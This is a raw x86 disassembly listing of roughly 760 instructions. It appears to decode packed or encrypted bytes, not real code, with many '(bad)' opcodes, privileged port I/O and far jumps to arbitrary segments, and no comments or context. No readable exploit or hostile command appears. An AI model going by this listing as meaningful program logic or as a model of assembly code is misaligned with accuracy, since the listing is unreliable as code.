  40bb10:	mov    ecx,0x7c812cd3
  40bb15:	jmp    0x40bb96
  40bb17:	arpl   WORD PTR [eax],cx
  40bb19:	nop
  40bb1a:	sahf   
  40bb1b:	mov    al,ds:0x2089a100
  40bb20:	rcl    DWORD PTR [edi+0x34deba0d],1
  40bb26:	sub    bl,BYTE PTR [ecx-0x5ded65e0]
  40bb2c:	clc    
  40bb2d:	jl     0x40bb6c
  40bb2f:	mov    dh,0xa6
  40bb31:	aas    
  40bb32:	cmc    
  40bb33:	jae    0x40bb0b
  40bb35:	test   al,0xae
  40bb37:	jle    0x40bad5
  40bb39:	in     eax,0x47
  40bb3b:	or     al,0x70
  40bb3d:	xchg   esi,eax
  40bb3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb3f:	or     ah,dh
  40bb41:	jmp    0x40bafb
  40bb43:	push   edi
  40bb44:	dec    edx
  40bb45:	cs and eax,0xae6cf3db
  40bb4b:	bound  ebx,QWORD PTR [edi]
  40bb4d:	aas    
  40bb4e:	pop    edi
  40bb4f:	fst    DWORD PTR [ebx]
  40bb51:	stos   DWORD PTR es:[edi],eax
  40bb52:	push   edx
  40bb53:	sti    
  40bb54:	les    ebx,FWORD PTR [ecx-0x4d6d073e]
  40bb5a:	mov    cl,0x39
  40bb5c:	ror    BYTE PTR [ecx+0x22],1
  40bb5f:	sub    dh,0x29
  40bb62:	add    al,0xf4
  40bb64:	aaa    
  40bb65:	fadd   DWORD PTR cs:[ebp+0x6216b2dd]
  40bb6c:	shr    BYTE PTR [ecx-0x18],1
  40bb6f:	push   ss
  40bb70:	dec    ebp
  40bb71:	dec    edx
  40bb72:	stos   BYTE PTR es:[edi],al
  40bb73:	addr16 xchg edx,eax
  40bb75:	shl    DWORD PTR [eax],1
  40bb77:	sbb    ah,bl
  40bb79:	lahf   
  40bb7a:	js     0x8076b374
  40bb80:	aam    0xda
  40bb82:	shl    ah,1
  40bb84:	push   gs
  40bb86:	ret    
  40bb87:	shl    bh,1
  40bb89:	out    0xda,al
  40bb8b:	test   BYTE PTR [esi+ecx*1-0x23],bl
  40bb8f:	xchg   ah,dh
  40bb91:	inc    ebp
  40bb92:	sub    edi,eax
  40bb94:	xlat   BYTE PTR ds:[ebx]
  40bb95:	(bad)  
  40bb96:	cmp    ebx,DWORD PTR [edx-0x58]
  40bb99:	xor    BYTE PTR [esi-0xd],0xec
  40bb9d:	push   cs
  40bb9e:	push   di
  40bba0:	mov    edx,0xce34bfd5
  40bba5:	xchg   ecx,eax
  40bba6:	fwait
  40bba7:	outs   dx,DWORD PTR ds:[esi]
  40bba8:	stos   BYTE PTR es:[edi],al
  40bba9:	or     edi,DWORD PTR [edi+0x50]
  40bbac:	xor    BYTE PTR [esi+ebx*8],cl
  40bbaf:	sahf   
  40bbb0:	cmc    
  40bbb1:	int    0xc5
  40bbb3:	mov    ebp,0xd74000de
  40bbb8:	and    ebp,edi
  40bbba:	rcr    BYTE PTR [ebx-0x3e],cl
  40bbbd:	or     al,0x64
  40bbbf:	imul   ecx,DWORD PTR [eax],0x4e
  40bbc2:	enter  0x84a1,0xc6
  40bbc6:	xor    DWORD PTR [edi-0x2ea5bb9a],ebx
  40bbcc:	push   ebx
  40bbcd:	or     al,0x10
  40bbcf:	(bad)  
  40bbd0:	js     0x40bc23
  40bbd2:	push   esi
  40bbd3:	test   dh,0xc3
  40bbd6:	push   edx
  40bbd7:	dec    edi
  40bbd8:	xor    al,BYTE PTR [esi+0x19a81115]
  40bbde:	mov    eax,ds:0x86c47552
  40bbe3:	jmp    0x40bb9e
  40bbe5:	sbb    BYTE PTR [esi+0x47],0x4a
  40bbe9:	jae    0x40bb96
  40bbeb:	xlat   BYTE PTR ds:[ebx]
  40bbec:	pop    es
  40bbed:	imul   esi,edx,0x24e4a370
  40bbf3:	and    eax,0x7d4ca83d
  40bbf8:	imul   eax,DWORD PTR [edx+0x4fddb984],0xd
  40bbff:	(bad)  
  40bc00:	loopne 0x40bc2c
  40bc02:	mov    bh,0x9d
  40bc04:	add    dh,0x67
  40bc07:	jecxz  0x40bc3a
  40bc09:	xchg   esp,eax
  40bc0a:	ins    BYTE PTR es:[edi],dx
  40bc0b:	sbb    ecx,DWORD PTR [eax+0x3f0568cf]
  40bc11:	sub    al,0x6f
  40bc13:	push   DWORD PTR cs:[edx+0x60]
  40bc17:	xchg   edi,eax
  40bc18:	mov    dh,0x3d
  40bc1a:	adc    al,0x93
  40bc1c:	and    BYTE PTR [esi],dl
  40bc1e:	hlt    
  40bc1f:	mov    esp,0x9750ac55
  40bc24:	mov    eax,0xa4c8f643
  40bc29:	daa    
  40bc2a:	lahf   
  40bc2b:	int3   
  40bc2c:	lods   al,BYTE PTR ds:[esi]
  40bc2d:	or     eax,esp
  40bc2f:	dec    edx
  40bc30:	or     eax,esp
  40bc32:	fs push cs
  40bc34:	iret   
  40bc35:	dec    ebp
  40bc36:	ja     0x40bbd3
  40bc38:	arpl   WORD PTR [ecx-0x79944a23],bx
  40bc3e:	call   0x6eb70362
  40bc43:	adc    ah,ah
  40bc45:	mov    esp,0xa59861ae
  40bc4a:	(bad)  
  40bc4c:	pop    ds
  40bc4d:	imul   esi,DWORD PTR [ebp+0x6e6b3eba],0xfffffffd
  40bc54:	push   eax
  40bc55:	arpl   WORD PTR [esi+0x1fd37d9d],cx
  40bc5b:	repnz into 
  40bc5d:	fadd   DWORD PTR [ebx+0xa782ecb]
  40bc63:	xor    eax,DWORD PTR [ebx]
  40bc65:	mov    ds:0x85e0068a,al
  40bc6a:	imul   ecx,eax,0x4c8d9a30
  40bc70:	lds    edi,FWORD PTR [ecx-0x27]
  40bc73:	xchg   DWORD PTR [edx-0x73],eax
  40bc76:	std    
  40bc77:	and    dl,BYTE PTR [esi-0x5dfd7ad9]
  40bc7d:	sub    eax,0x26d2fb0d
  40bc82:	jo     0x40bc2c
  40bc84:	and    cl,BYTE PTR [ecx]
  40bc86:	daa    
  40bc87:	jae    0x40bcc1
  40bc89:	in     eax,dx
  40bc8a:	mov    ecx,0xdffdf4b3
  40bc8f:	pop    edi
  40bc90:	lds    ecx,FWORD PTR [edx]
  40bc92:	mov    ecx,0x8863b915
  40bc97:	and    dl,bh
  40bc99:	faddp  st(3),st
  40bc9b:	or     BYTE PTR [edi],bl
  40bc9d:	and    BYTE PTR [edi-0x26],bh
  40bca0:	pop    esi
  40bca1:	mov    edx,0xea2784eb
  40bca6:	fisttp QWORD PTR [ecx-0x37749fdb]
  40bcac:	in     al,dx
  40bcad:	cmp    eax,0x2beeec7
  40bcb2:	int    0x58
  40bcb4:	std    
  40bcb5:	or     al,0x6c
  40bcb7:	or     BYTE PTR [edx+edx*4+0x0],cl
  40bcbb:	nop
  40bcbc:	dec    edi
  40bcbe:	adc    DWORD PTR [edx+0x4c610f33],ebx
  40bcc4:	in     eax,0x8
  40bcc6:	add    DWORD PTR [esi-0x33b78d23],ebx
  40bccc:	mov    DWORD PTR [eax-0x47],edx
  40bccf:	pop    ss
  40bcd0:	and    DWORD PTR [ebx],ebp
  40bcd2:	arpl   ax,di
  40bcd4:	mov    esp,0x4f17e274
  40bcd9:	and    DWORD PTR [esi-0x55787e23],0xffffffbe
  40bce0:	xor    DWORD PTR [eax],edi
  40bce2:	mov    ecx,0x8b4de0b5
  40bce7:	pop    ss
  40bce8:	mov    bl,0x19
  40bcea:	sub    DWORD PTR [edx],ecx
  40bcec:	and    al,0xdf
  40bcee:	fnstsw WORD PTR [edi+0x39723fd1]
  40bcf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf5:	(bad)  
  40bcf6:	cwde   
  40bcf7:	ret    0x3b4b
  40bcfa:	jmp    0xf611:0x21e2fc28
  40bd01:	ins    BYTE PTR es:[edi],dx
  40bd02:	aaa    
  40bd03:	mov    dh,0xe0
  40bd05:	mov    cl,0xfa
  40bd07:	adc    al,0x0
  40bd09:	outs   dx,BYTE PTR ds:[esi]
  40bd0a:	into   
  40bd0b:	imul   esi
  40bd0d:	clc    
  40bd0e:	adc    ebp,DWORD PTR [ecx]
  40bd10:	inc    esp
  40bd11:	out    0xe6,al
  40bd13:	mov    eax,0x61cf94fa
  40bd18:	out    dx,al
  40bd19:	jmp    0x446bdd8
  40bd1e:	mov    ds:0x7d65fbb,eax
  40bd23:	xor    al,0x48
  40bd25:	jmp    0x40bcbd
  40bd27:	mov    eax,ds:0x82eb3042
  40bd2c:	pop    edx
  40bd2d:	out    0xec,eax
  40bd2f:	xchg   ebp,eax
  40bd30:	add    al,0x1f
  40bd32:	mov    ebp,DWORD PTR [edx+0x71]
  40bd35:	inc    edx
  40bd36:	mov    bl,0x94
  40bd38:	sar    DWORD PTR [ecx-0x3cbb9487],cl
  40bd3e:	pop    esi
  40bd3f:	pop    es
  40bd40:	out    0x6,al
  40bd42:	addr16 js 0x40bd2e
  40bd45:	call   0x4a5:0x56021dea
  40bd4c:	sar    BYTE PTR [edi+0x22e4eef6],1
  40bd52:	inc    ebp
  40bd53:	or     DWORD PTR [esi],eax
  40bd55:	mov    esi,DWORD PTR [ecx-0x3cc3d8c6]
  40bd5b:	fld    QWORD PTR [edi]
  40bd5d:	test   BYTE PTR [esi-0x3f7fe935],dl
  40bd63:	push   0x3f27ea09
  40bd68:	sub    DWORD PTR [esi],eax
  40bd6a:	imul   BYTE PTR [ebx+0x40]
  40bd6d:	clc    
  40bd6e:	aaa    
  40bd6f:	mov    al,0x56
  40bd71:	sbb    ax,WORD PTR [eax+0x27bf8545]
  40bd78:	adc    BYTE PTR [ebp-0x29],ch
  40bd7b:	imul   esp,DWORD PTR [ebp+0x5ecdfba5],0x1e771684
  40bd85:	call   0x4ca0f3b7
  40bd8a:	lds    eax,FWORD PTR [edx+0x22]
  40bd8d:	outs   dx,BYTE PTR ds:[esi]
  40bd8e:	leave  
  40bd8f:	mov    cl,0xd1
  40bd91:	or     al,ah
  40bd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd94:	sub    DWORD PTR [edi],0xffffffd4
  40bd97:	xchg   BYTE PTR [ecx],cl
  40bd99:	add    eax,ebp
  40bd9b:	mov    esp,?
  40bd9d:	push   eax
  40bd9e:	aas    
  40bd9f:	push   es
  40bda0:	jno    0x40bd96
  40bda2:	ret    
  40bda3:	push   esi
  40bda4:	cdq    
  40bda5:	ins    BYTE PTR es:[edi],dx
  40bda6:	clc    
  40bda7:	mov    bl,0x1
  40bda9:	retf   0x34ce
  40bdac:	sbb    eax,0xd304e68d
  40bdb1:	arpl   WORD PTR [eax-0x64c88ffe],bp
  40bdb7:	mov    eax,0xd87cd221
  40bdbc:	js     0x40bdeb
  40bdbe:	(bad)  
  40bdbf:	test   BYTE PTR ds:0x338fbae3,0x7a
  40bdc6:	sub    dl,BYTE PTR [ebp+0x89a8064]
  40bdcc:	imul   esp,DWORD PTR [eax-0x22],0x635d9510
  40bdd3:	mov    cl,0x99
  40bdd5:	jge    0x40bdc7
  40bdd7:	fiadd  WORD PTR [edi+0x53f6ca8d]
  40bddd:	pop    ss
  40bdde:	adc    dl,BYTE PTR [ebx-0x327dc03d]
  40bde4:	adc    dh,BYTE PTR [ebp+0x54]
  40bde7:	mov    esi,0xfa0e8b23
  40bdec:	das    
  40bded:	retf   
  40bdee:	xchg   BYTE PTR ss:[edx+0x17627ea1],bh
  40bdf5:	out    0x2e,al
  40bdf7:	xor    al,0xee
  40bdf9:	and    cl,BYTE PTR [edx+0x5a70299]
  40bdff:	rep ins DWORD PTR es:[edi],dx
  40be01:	pop    ecx
  40be02:	mov    eax,DWORD PTR [esi-0x7521fa51]
  40be08:	test   eax,0xa3ae80cb
  40be0d:	aas    
  40be0e:	cmp    al,BYTE PTR [ecx]
  40be10:	out    0x71,al
  40be12:	cmp    DWORD PTR [edi],ebx
  40be14:	and    dh,dh
  40be16:	sbb    al,0xa3
  40be19:	popf   
  40be1a:	(bad)  
  40be1b:	scas   eax,DWORD PTR es:[edi]
  40be1c:	adc    BYTE PTR [esp+ebx*4],dl
  40be1f:	mov    dl,0xe9
  40be21:	mov    al,ds:0xddb363d0
  40be26:	inc    edi
  40be27:	retf   0x79
  40be2a:	cmp    bl,BYTE PTR [esi-0x68]
  40be2d:	test   ebp,ecx
  40be2f:	es pop esp
  40be31:	sub    ah,bl
  40be33:	xchg   DWORD PTR [eax],esp
  40be35:	or     al,dl
  40be37:	in     eax,0xfd
  40be39:	and    dh,BYTE PTR [ecx-0x2384e470]
  40be3f:	sbb    cl,dl
  40be41:	pop    esi
  40be42:	iret   
  40be43:	jecxz  0x40bde0
  40be45:	sub    eax,0xaa1c0df3
  40be4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be4b:	jno    0x40beba
  40be4d:	inc    ebx
  40be4e:	sbb    ch,cl
  40be50:	xor    eax,0x926d85de
  40be55:	sub    al,ch
  40be57:	ds je  0x40be81
  40be5a:	lea    ebx,[ecx]
  40be5c:	jns    0x40be16
  40be5e:	into   
  40be5f:	les    ecx,FWORD PTR [edx]
  40be61:	mov    cl,0x45
  40be63:	ss jge 0x40be87
  40be66:	and    BYTE PTR [ecx-0x7a],0x51
  40be6a:	cmc    
  40be6b:	pop    eax
  40be6c:	sti    
  40be6d:	sub    ebx,0xffffffa5
  40be70:	mov    ds:0xb3ab2e57,al
  40be75:	jns    0x40bebf
  40be77:	cmp    eax,0xe1a43c57
  40be7c:	sub    dh,0x77
  40be7f:	mov    ds,edi
  40be81:	xchg   edx,eax
  40be82:	shl    dh,cl
  40be84:	jno    0x40be29
  40be86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be87:	xchg   DWORD PTR [ecx],edx
  40be89:	test   ebx,edx
  40be8b:	push   cs
  40be8c:	jecxz  0x40be1f
  40be8e:	pop    esi
  40be8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be90:	aaa    
  40be91:	mov    dl,BYTE PTR [ecx-0x6a]
  40be94:	je     0x40bede
  40be96:	or     BYTE PTR cs:[eax],0x19
  40be9a:	lods   al,BYTE PTR ds:[esi]
  40be9b:	js     0x40be80
  40be9d:	data16 or al,0xfc
  40bea0:	sub    al,0x35
  40bea2:	adc    ebx,DWORD PTR [ebx+0x3a]
  40bea5:	xor    al,0xe7
  40bea7:	aam    0xcc
  40bea9:	push   eax
  40beaa:	mov    edx,0x94db5d6
  40beaf:	and    al,0x9b
  40beb1:	inc    eax
  40beb2:	mov    dl,BYTE PTR [ecx]
  40beb4:	(bad)  
  40beb5:	jne    0x40be5c
  40beb7:	out    0xc4,eax
  40beb9:	cmp    dl,BYTE PTR [esi]
  40bebb:	pop    eax
  40bebc:	jp     0x40bed4
  40bebe:	adc    BYTE PTR [ecx+0x2c],al
  40bec1:	sub    BYTE PTR [edi-0x15],bl
  40bec4:	ret    
  40bec5:	mov    esp,0x3cb5f7fd
  40beca:	pop    es
  40becb:	imul   DWORD PTR [ecx]
  40becd:	sbb    eax,0x83400836
  40bed2:	xchg   ebp,eax
  40bed3:	rcl    BYTE PTR [eax-0x3bba84a2],0xa9
  40beda:	mov    esp,0xdfce64b9
  40bedf:	stos   DWORD PTR es:[edi],eax
  40bee0:	jne    0x40bee2
  40bee2:	fs test eax,0x692fd18
  40bee8:	inc    esp
  40bee9:	aad    0xf2
  40beeb:	add    BYTE PTR [eax+0x36],bl
  40beee:	push   ebx
  40beef:	cmp    ah,bh
  40bef1:	jmp    0x2b60:0x54c54e1a
  40bef8:	push   eax
  40bef9:	(bad)  
  40befa:	push   0x21b56d10
  40beff:	bnd jns 0x40beaa
  40bf02:	jecxz  0x40beb8
  40bf04:	jnp    0x40bf3c
  40bf06:	pop    ss
  40bf07:	scas   eax,DWORD PTR es:[edi]
  40bf08:	fdivr  DWORD PTR [ecx+0x9]
  40bf0b:	adc    eax,0xa7e64b65
  40bf10:	xchg   ch,dh
  40bf12:	aaa    
  40bf13:	in     eax,0x8
  40bf15:	or     ebp,DWORD PTR [ecx+0x79]
  40bf18:	push   edx
  40bf19:	pop    edi
  40bf1a:	mov    ebx,0x797e3935
  40bf1f:	ret    
  40bf20:	std    
  40bf21:	and    al,0xa9
  40bf23:	sti    
  40bf24:	or     ch,cl
  40bf26:	mov    ebp,0x7b601c1d
  40bf2b:	pushf  
  40bf2c:	icebp  
  40bf2d:	mov    al,ds:0x73305bca
  40bf32:	es mov bh,0x12
  40bf35:	and    eax,0x27b78def
  40bf3a:	xor    al,0x1f
  40bf3c:	stc    
  40bf3d:	test   DWORD PTR [ecx],0xdcd1f679
  40bf43:	ds sbb esi,ebp
  40bf46:	jge    0x40bf45
  40bf48:	xor    BYTE PTR [edi-0x33],0x87
  40bf4c:	arpl   WORD PTR [eax-0x5a],dx
  40bf4f:	add    al,0xa8
  40bf51:	cmc    
  40bf52:	ret    0x507c
  40bf55:	popa   
  40bf56:	xchg   ebp,eax
  40bf57:	outs   dx,DWORD PTR ds:[esi]
  40bf58:	add    cl,BYTE PTR [ebp+0x13]
  40bf5b:	cmp    DWORD PTR [edx],edi
  40bf5d:	mov    esi,0x61d80aee
  40bf62:	add    BYTE PTR [eax],dl
  40bf64:	mov    al,ds:0x8fc6082b
  40bf69:	ins    BYTE PTR es:[edi],dx
  40bf6a:	pop    es
  40bf6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf6c:	cld    
  40bf6d:	enter  0x9e6e,0x8
  40bf71:	jnp    0x40bf5a
  40bf73:	adc    ah,BYTE PTR [ecx+0x7244683d]
  40bf79:	lahf   
  40bf7a:	mov    ah,0xe4
  40bf7c:	pop    eax
  40bf7e:	push   esi
  40bf7f:	jb     0x40bfed
  40bf81:	pop    ss
  40bf82:	fsub   DWORD PTR [ecx+edx*8-0x2b228e1e]
  40bf89:	shl    BYTE PTR [ebx+0x20],cl
  40bf8c:	mov    DWORD PTR [edi],ebx
  40bf8e:	js     0x40bfb5
  40bf90:	not    BYTE PTR [ebx+ebx*4+0x44a512fa]
  40bf97:	xor    edi,DWORD PTR [edx-0x7e]
  40bf9a:	jle    0x40bf9b
  40bf9c:	sub    al,0x2f
  40bf9e:	or     DWORD PTR [edx],eax
  40bfa0:	pop    esi
  40bfa1:	xchg   ecx,ebp
  40bfa3:	jecxz  0x40bf34
  40bfa5:	les    edi,FWORD PTR [edx]
  40bfa7:	js     0x40bf69
  40bfa9:	neg    BYTE PTR [si+0x7a]
  40bfad:	retf   
  40bfae:	jb     0x40c00a
  40bfb0:	sbb    DWORD PTR [ecx-0x7959ec03],esi
  40bfb6:	test   al,0x9
  40bfb8:	out    0x38,eax
  40bfba:	pop    ebp
  40bfbb:	stos   BYTE PTR es:[edi],al
  40bfbc:	mov    ds:0xcb4f3832,eax
  40bfc1:	ins    BYTE PTR es:[edi],dx
  40bfc2:	pop    ebx
  40bfc3:	arpl   dx,bx
  40bfc5:	adc    esp,DWORD PTR [ecx-0x3602f0bc]
  40bfcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfcc:	and    BYTE PTR [esi+0x2f],dh
  40bfcf:	cwde   
  40bfd0:	lods   al,BYTE PTR ds:[esi]
  40bfd1:	cdq    
  40bfd2:	push   cs
  40bfd3:	jae    0x40c019
  40bfd5:	stc    
  40bfd6:	shr    DWORD PTR [edx-0x44],0x96
  40bfda:	js     0x40bfc0
  40bfdc:	adc    DWORD PTR [eax-0x32],ebx
  40bfdf:	in     eax,0xe9
  40bfe1:	popa   
  40bfe2:	mov    al,0xa9
  40bfe4:	call   ecx
  40bfe6:	adc    eax,0xc95c074
  40bfeb:	or     al,0xe8
  40bfed:	mov    dh,0x98
  40bfef:	and    BYTE PTR [ecx],al
  40bff1:	es xchg ecx,eax
  40bff3:	retf   
  40bff4:	into   
  40bff5:	cmp    DWORD PTR ds:0x254d10c4,0xffffffa4
  40bffc:	mov    ebp,0x37070edf
  40c001:	jmp    FWORD PTR [ebx]
  40c003:	test   BYTE PTR [bx+si+0x2fd4],ah
  40c008:	call   0x2c60:0x270efca0
  40c00f:	fwait
  40c010:	and    ch,BYTE PTR [edx-0x58d9601b]
  40c016:	dec    ebx
  40c017:	repz sbb eax,0x382964dc
  40c01d:	lods   al,BYTE PTR ds:[esi]
  40c01e:	stos   DWORD PTR es:[edi],eax
  40c01f:	and    DWORD PTR [edx*8-0x36ff8868],ebp
  40c026:	and    DWORD PTR [edx-0x6005232b],edx
  40c02c:	push   ss
  40c02d:	dec    edi
  40c02e:	icebp  
  40c02f:	jle    0x40c031
  40c031:	scas   eax,DWORD PTR es:[edi]
  40c032:	sbb    eax,0x285ace4d
  40c037:	pop    ds
  40c038:	mov    DWORD PTR [edi+0x57404efb],ecx
  40c03e:	rol    BYTE PTR ds:0xce733ec9,cl
  40c044:	sub    eax,0xc1b4c323
  40c049:	sbb    BYTE PTR [esi+0x222b230d],0xfd
  40c050:	push   esi
  40c051:	popf   
  40c052:	int    0x15
  40c054:	mov    ebp,0xf843d26a
  40c059:	add    eax,0xbc52adaf
  40c05e:	ret    0x29b1
  40c061:	xchg   ebp,eax
  40c062:	inc    edi
  40c063:	dec    edx
  40c064:	rol    esp,cl
  40c066:	mov    edi,0x6167032a
  40c06b:	push   ds
  40c06c:	mov    WORD PTR [ebp-0x2497fb9e],ds
  40c072:	inc    ebp
  40c073:	dec    esp
  40c074:	cmp    BYTE PTR cs:[esi+0x3c],0xc4
  40c079:	in     eax,0x35
  40c07b:	mov    esp,0x952eeb0d
  40c080:	adc    eax,0x4acccbaf
  40c085:	pushf  
  40c086:	mov    ebp,0x19573d44
  40c08b:	imul   eax,DWORD PTR [eax],0x3e
  40c08e:	cmp    eax,0xa33e1792
  40c093:	cld    
  40c094:	frstor [edi+0x6c]
  40c097:	jle    0x40c061
  40c099:	daa    
  40c09a:	scas   eax,DWORD PTR es:[edi]
  40c09b:	addr16 hlt 
  40c09d:	jmp    0x40c0f9
  40c09f:	mov    DWORD PTR [edi],ebx
  40c0a1:	mul    eax
  40c0a3:	ins    DWORD PTR es:[edi],dx
  40c0a4:	sar    eax,1
  40c0a6:	call   0xf94538e2
  40c0ab:	out    0x7e,eax
  40c0ad:	fisubr WORD PTR [ebp-0x36]
  40c0b0:	in     eax,dx
  40c0b1:	adc    ah,BYTE PTR [edi+0x23f440f1]
  40c0b7:	in     eax,0x48
  40c0b9:	setno  dl
  40c0bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0bd:	and    cl,BYTE PTR ds:0x14222177
  40c0c3:	cmp    DWORD PTR [edi+ebx*4-0x44047147],esp
  40c0ca:	adc    al,0x83
  40c0cc:	imul   esi,DWORD PTR [edi],0x7f
  40c0cf:	ret    0x4909
  40c0d2:	jo     0x40c0a8
  40c0d4:	pop    edx
  40c0d5:	pop    ebx
  40c0d6:	fcomp  DWORD PTR [edi]
  40c0d8:	call   0xd33:0x8129fbf3
  40c0df:	fcmovu st,st(2)
  40c0e1:	je     0x40c156
  40c0e3:	sub    DWORD PTR [esi],ebx
  40c0e5:	rol    ebx,0x64
  40c0e8:	jg     0x40c0d7
  40c0ea:	dec    esi
  40c0eb:	daa    
  40c0ec:	adc    BYTE PTR [ecx-0x67],bl
  40c0ef:	les    edx,FWORD PTR [eax]
  40c0f1:	inc    esp
  40c0f2:	pop    eax
  40c0f3:	les    eax,FWORD PTR [edx+0x1b]
  40c0f6:	add    DWORD PTR [edi+0x37],esp
  40c0f9:	movshdup xmm6,XMMWORD PTR [ebp+0x77]
  40c0fe:	das    
  40c0ff:	gs (bad) 
  40c101:	xor    eax,0x6755997a
  40c106:	fcmovnbe st,st(0)
  40c108:	ja     0x40c12a
  40c10a:	bsr    edx,DWORD PTR [ecx+0x1ae75f9a]
  40c111:	in     al,0xfb
  40c113:	jecxz  0x40c125
  40c115:	in     eax,0xa3
  40c117:	pushf  
  40c118:	xor    ch,bl
  40c11a:	imul   edi,esi,0x20b0f28e
  40c120:	dec    ebx
  40c121:	inc    ecx
  40c122:	aam    0xdb
  40c124:	jno    0x40c188
  40c126:	mov    esp,0x1f020390
  40c12b:	jmp    0x40c1a8
  40c12d:	xchg   DWORD PTR [ecx+0x3a],ebx
  40c130:	mov    DWORD PTR [eax+ebx*1],esi
  40c133:	out    dx,al
  40c134:	jp     0x40c0e1
  40c136:	mov    ds:0x28f73d23,eax
  40c13b:	sbb    bh,BYTE PTR [ecx-0x19361457]
  40c141:	jmp    0x9a91:0x79bc5732
  40c148:	cmp    DWORD PTR [edx+ecx*2-0x67df251e],ebx
  40c14f:	outs   dx,DWORD PTR ds:[esi]
  40c150:	pusha  
  40c151:	mov    ecx,0x46157992
  40c156:	jle    0x40c167
  40c158:	aas    
  40c159:	dec    eax
  40c15a:	mov    ebp,0x33020a72
  40c15f:	lods   eax,DWORD PTR ds:[esi]
  40c160:	scas   al,BYTE PTR es:[edi]
  40c161:	fcom   DWORD PTR [ebp+0x1d]
  40c164:	xchg   edi,eax
  40c165:	fisubr WORD PTR [edi+0x77]
  40c168:	loop   0x40c16d
  40c16a:	jge    0x40c1b8
  40c16c:	push   ds
  40c16d:	(bad)  
  40c16f:	(bad)  
  40c170:	xor    eax,0x9b7091de
  40c175:	push   edi
  40c176:	mov    ebx,0xfcad4fec
  40c17b:	pop    edi
  40c17c:	fsubp  st(2),st
  40c17e:	sub    eax,0x9c25afb2
  40c183:	mov    ebx,0x94c86335
  40c188:	ret    
  40c189:	adc    DWORD PTR [ebx-0x36],ecx
  40c18c:	xchg   ebx,eax
  40c18d:	nop
  40c18e:	lods   al,BYTE PTR ds:[esi]
  40c18f:	sub    BYTE PTR [edx+0x688c0077],0x1e
  40c196:	pop    ebp
  40c197:	fs lahf 
  40c199:	rol    dh,cl
  40c19b:	shufps xmm6,XMMWORD PTR [ecx],0xee
  40c19f:	mov    ch,0xe2
  40c1a1:	int3   
  40c1a2:	push   ebx
  40c1a3:	gs scas eax,DWORD PTR es:[edi]
  40c1a5:	lods   al,BYTE PTR ds:[esi]
  40c1a6:	call   0x3a9e:0x5c9529ac
  40c1ad:	push   edx
  40c1ae:	(bad)  
  40c1af:	ins    DWORD PTR es:[edi],dx
  40c1b0:	fsub   QWORD PTR [edx+0x71bdd608]
  40c1b6:	aas    
  40c1b7:	and    ebx,DWORD PTR [esi+ecx*1]
  40c1ba:	iret   
  40c1bb:	or     bl,al
  40c1bd:	adc    cl,BYTE PTR [edi+eax*4+0x9]
  40c1c1:	dec    ebp
  40c1c2:	pop    ebp
  40c1c3:	ret    
  40c1c4:	daa    
  40c1c5:	cmp    al,0x8d
  40c1c7:	lahf   
  40c1c8:	hlt    
  40c1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1ca:	push   edi
  40c1cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1cc:	inc    eax
  40c1cd:	mov    bh,0x8a
  40c1cf:	leave  
  40c1d0:	cmp    BYTE PTR ds:[ebx+0x6a],bh
  40c1d4:	gs ja  0x40c248
  40c1d7:	xor    esi,eax
  40c1d9:	mov    edx,DWORD PTR [edi+0x452150bf]
  40c1df:	inc    ebx
  40c1e0:	cmp    al,BYTE PTR [edi-0x1f04040c]
  40c1e6:	jmp    0x4c8692c8
  40c1eb:	or     dh,BYTE PTR [esi+eax*4]
  40c1ee:	xchg   ecx,eax
  40c1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f0:	lds    esi,FWORD PTR ds:0xff2b77b2
  40c1f6:	inc    eax
  40c1f7:	adc    eax,DWORD PTR [esi+ebx*4-0x3d]
  40c1fb:	sbb    al,0x52
  40c1fd:	add    eax,0x14e21ceb
  40c202:	xor    DWORD PTR [esi-0x68731ece],0x87a4bc72
  40c20c:	add    al,0xa7
  40c20e:	(bad)  
  40c211:	ror    DWORD PTR [esi-0x7b2a9c87],0x64
  40c218:	mov    ebx,0xd5b473a1
  40c21d:	stc    
  40c21e:	jnp    0x40c1d5
  40c220:	mov    al,ds:0xe24588cd
  40c225:	(bad)  
  40c226:	leave  
  40c227:	loope  0x40c235
  40c229:	mov    BYTE PTR [ebx+0x6c9e801d],al
  40c22f:	arpl   WORD PTR [ecx-0x6f3113ba],cx
  40c235:	jecxz  0x40c282
  40c237:	test   esp,esi
  40c239:	in     eax,dx
  40c23a:	adc    al,0x82
  40c23c:	arpl   WORD PTR [ecx],dx
  40c23e:	cld    
  40c23f:	ficom  WORD PTR [eax+0x61]
  40c242:	mov    al,0xca
  40c244:	push   ebx
  40c245:	test   al,0xf1
  40c247:	test   BYTE PTR [ecx+0x70],bl
  40c24a:	inc    esp
  40c24b:	sbb    eax,0x5561786f
  40c250:	pop    ss
  40c251:	jg     0x40c20f
  40c253:	and    BYTE PTR ds:[eax],0xc9
  40c257:	pop    edx
  40c258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c259:	mov    gs,WORD PTR [edx+0x39228985]
  40c25f:	mov    dh,0xca
  40c261:	jmp    FWORD PTR [esi]
  40c263:	out    0x25,eax
  40c265:	in     al,0x18
  40c267:	or     esi,DWORD PTR [esi-0x6919ff3d]
  40c26d:	mov    esi,0x96b38f04
  40c272:	out    0x6,al
  40c274:	jp     0x40c279
  40c276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c277:	addr16 jp 0x40c285
  40c27a:	lea    esi,[esp+esi*4-0x5981e244]
  40c281:	in     eax,0x87
  40c283:	test   esp,0x5abb7f04
  40c289:	cmp    DWORD PTR gs:[edi],esp
  40c28c:	adc    eax,0x9d50bbeb
  40c291:	aad    0x5
  40c293:	jne    0x40c24e
  40c295:	inc    esp
  40c296:	jmp    0xb63b:0xe49f2cfa
  40c29d:	test   eax,0xd6870d73
  40c2a2:	add    ah,dl
